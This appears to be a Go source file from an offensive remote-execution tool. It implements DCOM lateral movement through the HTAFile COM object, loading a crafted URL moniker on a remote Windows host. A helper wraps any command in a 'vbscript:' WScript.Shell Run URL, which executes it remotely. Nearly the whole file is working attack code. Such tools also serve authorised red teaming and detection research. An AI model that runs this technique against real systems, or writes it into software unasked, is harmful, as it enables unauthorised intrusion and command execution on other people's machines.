package dcomexec

import (
  "context"
  "encoding/binary"
  "fmt"
  "strings"

  "github.com/FalconOpsLLC/goexec/pkg/goexec"
  "github.com/oiweiwei/go-msrpc/midl/uuid"
  "github.com/oiweiwei/go-msrpc/msrpc/dcom"
  "github.com/oiweiwei/go-msrpc/msrpc/dcom/urlmon"
  "github.com/oiweiwei/go-msrpc/msrpc/dcom/urlmon/imoniker/v0"
  "github.com/oiweiwei/go-msrpc/msrpc/dcom/urlmon/ipersistmoniker/v0"
  "github.com/oiweiwei/go-msrpc/msrpc/dtyp"
  _ "github.com/oiweiwei/go-msrpc/msrpc/erref/hresult"
  _ "github.com/oiweiwei/go-msrpc/msrpc/erref/ntstatus"
  _ "github.com/oiweiwei/go-msrpc/msrpc/erref/win32"
  "github.com/oiweiwei/go-msrpc/ndr"
  "github.com/oiweiwei/go-msrpc/text/encoding/utf16le"
  "github.com/rs/zerolog"
)

const (
  MethodHtafile  = "HTAFile"
  HtafileUuid    = "3050F4D8-98B5-11CF-BB82-00AA00BDCE0B"
  serialUuid     = "F4815879-1D3B-487F-AF2C-825DC4852763"
  urlMonikerUuid = "79EAC9E0-BAF9-11CE-8C82-00AA004BA90B"
)

const ( // See https://learn.microsoft.com/en-us/openspecs/office_file_formats/ms-oshared/1786df8e-b792-4a28-b7c5-4d9a91d2e401
  UriCreateAllowRelative               uint32 = 0x00000001
  UriCreateAllowImplicitWildcardScheme uint32 = 0x00000002
  UriCreateAllowImplicitFileScheme     uint32 = 0x00000004
  UriCreateNoFrag                      uint32 = 0x00000008
  UriCreateNoCanonicalize              uint32 = 0x00000010
  UriCreateFileUseDosPath              uint32 = 0x00000020
  UriCreateDecodeExtraInfo             uint32 = 0x00000040
  UriCreateNoDecodeExtraInfo           uint32 = 0x00000080
  UriCreateCanonicalize                uint32 = 0x00000100
  UriCreateCrackUnknownSchemes         uint32 = 0x00000200
  UriCreateNoCrackUnknownSchemes       uint32 = 0x00000400
  UriCreatePreProcessHTMLURI           uint32 = 0x00000800
  UriCreateNoPreProcessHTMLURI         uint32 = 0x00001000
  UriCreateIESettings                  uint32 = 0x00002000
  UriCreateNoIESettings                uint32 = 0x00004000
  UriCreateNoEncodeForbiddenChars      uint32 = 0x00008000
  UriCreateNormalizeIntlChars          uint32 = 0x00010000
)

type DcomHtafile struct {
  Dcom
  Url        string
  Vbscript   string
  Javascript string
  ipm        ipersistmoniker.PersistMonikerClient
}

// Init will initialize the ShellBrowserWindow instance
func (m *DcomHtafile) Init(ctx context.Context) (err error) {
  if err = m.Dcom.Init(ctx); err != nil {
    return err
  }
  opts, err := m.bindInstance(ctx, uuid.MustParse(HtafileUuid), ipersistmoniker.PersistMonikerIID)
  if err != nil {
    return fmt.Errorf("bind htafile instance: %w", err)
  }
  if m.ipm, err = ipersistmoniker.NewPersistMonikerClient(ctx, m.Client.Dce(), opts...); err != nil {
    return fmt.Errorf("init IPersistMoniker client: %w", err)
  }
  return
}

func (m *DcomHtafile) Execute(ctx context.Context, execIO *goexec.ExecutionIO) (err error) {
  log := zerolog.Ctx(ctx)
  mon, err := getUrlMoniker(m.Url, 0)
  if err != nil {
    return fmt.Errorf("create url moniker structure: %w", err)
  }
  log.Info().Str("URL", m.Url).Msg("Loading URL moniker")
  lrs, err := m.ipm.Load(ctx, &ipersistmoniker.LoadRequest{
    This: &dcom.ORPCThis{Version: m.comVersion},
    Name: mon,
  })
  if err != nil {
    return fmt.Errorf("IPersistMoniker.Load: %w", err)
  }
  if lrs.Return == 0 {
    log.Info().Msg("Load call successful")
  } else {
    log.Warn().Msgf("Load call returned %d", lrs.Return)
  }
  _ = lrs
  return
}

type URLMoniker struct {
  URL           string
  HasExtras     bool   // whether to include trailer with SerialGUID/SerialVersion/URIFlags on marshal
  SerialVersion uint32 // should be 0 when HasExtras; preserved on unmarshal
  URIFlags      uint32 // the URICreateFlags bitmask (meaning per CreateUri)
}

// MarshalBinary implements encoding.BinaryMarshaler.
func (m URLMoniker) MarshalBinary() ([]byte, error) {
  // UTF-16LE encode URL + terminating NUL.
  urlBytes, err := utf16le.Encode(m.URL + "\x00")
  if err != nil {
    return nil, err
  }
  var out []byte
  if m.HasExtras {
    out = make([]byte, 4+len(urlBytes)+16+4+4)
    copy(out[4+len(urlBytes):], uuid.MustParse(serialUuid).EncodeBinary())
    binary.LittleEndian.PutUint32(out[4+len(urlBytes)+16:], m.SerialVersion)
    binary.LittleEndian.PutUint32(out[4+len(urlBytes)+16+4:], m.URIFlags)
  } else {
    out = make([]byte, 4+len(urlBytes))
  }
  binary.LittleEndian.PutUint32(out, uint32(len(out)-4))
  copy(out[4:], urlBytes)

  return out, nil
}

func getUrlMoniker(url string, flags uint32) (*urlmon.Moniker, error) {
  blob, err := URLMoniker{URL: url, HasExtras: true, URIFlags: flags}.MarshalBinary()
  if err != nil {
    return nil, err
  }
  objRef := &dcom.ObjectReference{
    Signature: ([]byte)(dcom.ObjectReferenceCustomSignature),
    Flags:     dcom.ObjectReferenceTypeCustom,
    IID:       imoniker.MonikerIID,
    ObjectReference: &dcom.ObjectReference_ObjectReference{
      Value: &dcom.ObjectReference_Custom{
        Custom: &dcom.ObjectReferenceCustom{
          ClassID:    (*dcom.ClassID)(dtyp.GUIDFromUUID(uuid.MustParse(urlMonikerUuid))),
          ObjectData: blob,
        },
      },
    },
  }
  dat, err := ndr.Marshal(objRef, ndr.Opaque)
  if err != nil {
    return nil, err
  }
  return &urlmon.Moniker{Data: dat}, nil
}

func HtafileGetUrl(url, jscript, vbscript string, execIO *goexec.ExecutionIO) string {
  switch {
  case url != "":
  case vbscript != "":
    return "vbscript:" + vbscript
  case jscript != "":
    return "javascript:" + jscript
  case execIO != nil:
    return getVbscriptCmdExecUrl(execIO.String())
  }
  return url
}

func getVbscriptCmdExecUrl(cmd string) string {
  return fmt.Sprintf(`vbscript:Close(CreateObject("WScript.Shell").Run("%s"))`, strings.ReplaceAll(cmd, `"`, `""`))
}
